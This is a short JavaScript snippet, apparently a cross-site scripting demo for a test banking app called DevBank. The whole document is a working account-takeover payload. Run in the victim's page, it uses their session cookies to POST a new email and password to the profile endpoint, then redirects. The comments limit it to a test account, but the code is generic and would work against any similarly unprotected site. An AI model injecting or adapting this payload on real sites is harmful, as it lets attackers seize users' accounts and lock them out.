// This demo updates only the logged-in DevBank test account.
const data = new URLSearchParams({
  // These values are sent to the profile update endpoint.
  email: "alice-xss-demo@devbank.local",
  password: "xss-demo-password"
});

// The script runs in DevBank's page and uses the victim's session.
fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  credentials: "include",
  body: data
}).then(() => {
  // Display the profile after the update.
  window.location = "/profile";
});
